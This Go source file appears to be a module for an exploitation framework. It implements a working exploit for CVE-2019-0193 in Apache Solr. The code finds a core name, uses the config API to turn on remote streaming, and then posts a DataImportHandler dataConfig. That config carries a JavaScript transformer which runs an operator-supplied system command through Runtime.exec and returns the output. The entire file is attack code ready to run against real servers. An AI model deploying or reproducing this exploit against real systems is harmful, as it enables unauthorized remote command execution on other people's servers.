package exp_Apache_Solr

import (
	"encoding/json"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"github.com/lz520520/railgunlib/pkg/utils/lznet/lzhttp"
	"net/url"
	"regexp"
	"strings"
)

type Exp_CVE_2019_0193 struct {
	exp_templates.ExpTemplate
}
type TT struct {
	ResponseHeader struct {
		Status int `json:"status"`
		QTime  int `json:"QTime"`
	} `json:"responseHeader"`
	WARNING string `json:"WARNING"`
}

func replace(input string) string {
	input = strings.ReplaceAll(input, " ", "")
	input = strings.ReplaceAll(input, "\n", "")
	return input
}
func (self *Exp_CVE_2019_0193) Attack_cmd1() (expResult exp_model.ExpResult) {
	cmd := self.MustGetStringParam("cmd")
	headers := self.GetInitExpHeaders()
	httpresp := self.HttpGetWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/solr/admin/cores?indexInfo=false&wt=json"), headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if strings.Contains(httpresp.Body, `responseHeader`) && strings.Contains(httpresp.Body, `name`) {
		name := regexp.MustCompile(`"status":{"(.*?)":\{"name"`).FindStringSubmatch(replace(httpresp.Body))
		self.EchoInfoMsg("核心名：" + name[1])
		enabled := "{\"set-property\": {\"requestDispatcher.requestParsers.enableRemoteStreaming\": true}, \"set-property\": {\"requestDispatcher.requestParsers.enableStreamBody\": true}}"
		headers.Set("Content-Type", "application/json")
		httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/solr/"+name[1]+"/config"), enabled, headers)
		if httpresp.Err != nil {
			expResult.Err = httpresp.Err.Error()
			return
		}
		TT := TT{}
		jsonErr := json.Unmarshal([]byte(httpresp.Body), &TT)
		if jsonErr != nil {
			expResult.Err = jsonErr.Error()
			return
		}
		status := TT.ResponseHeader.Status
		if status == 0 {
			self.EchoInfoMsg("enableStreamBody&enableRemoteStreaming开启成功")
			dataConfig := `<dataConfig>
<dataSource name="streamsrc" type="ContentStreamDataSource" loggerLevel="TRACE" />

  <script><![CDATA[
          function poc(row){
 var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("cmd").getInputStream()));

var result = [];

while(true) {
var oneline = bufReader.readLine();
result.push( oneline );
if(!oneline) break;
}

row.put("title",result.join("\n\r"));
return row;

}

]]></script>

<document>
    <entity
        stream="true"
        name="entity1"
        datasource="streamsrc1"
        processor="XPathEntityProcessor"
        rootEntity="true"
        forEach="/RDF/item"
        transformer="script:poc">
             <field column="title" xpath="/RDF/item/title" />
    </entity>
</document>
</dataConfig>`
			dataConfig = strings.Replace(dataConfig, "cmd", cmd, 1)
			payload := "/solr/" + name[1] + "/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=" + url.PathEscape(dataConfig)
			data := []lzhttp.PostMultiPart{
				{
					"stream.body",
					"",
					"",
					[]byte("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<RDF>\n<item/>\n</RDF>"),
				},
			}
			httpresp := self.HttpPostMultiWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, payload), data, headers)
			if httpresp.Err != nil {
				expResult.Err = httpresp.Err.Error()
				return
			}
			expResult.Status = true
			result := regexp.MustCompile(`"title":\["([\s\S]*)"]}],\n  "verbose-`).FindStringSubmatch(httpresp.Body)
			if result == nil {
				result = regexp.MustCompile(`"title":\["(.*?)"\]`).FindStringSubmatch(httpresp.Body)
				if result == nil {
					self.EchoInfoMsg("利用成功，未匹配到回显结果！")
					return
				}
				expResult.Result = strings.ReplaceAll(result[1], "\\n\\r", "\n")
			} else {
				expResult.Result = strings.ReplaceAll(result[1], "\\n\\r", "\n")
			}
		} else {
			self.EchoErrMsg("enableStreamBody&enableRemoteStreaming开启失败！")
			return
		}
	} else {
		self.EchoErrMsg("未找到核心名或漏洞不存在！")
	}
	return

}

// func
func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2019_0193{}, "exp_CVE_2019_0193.yml")

}
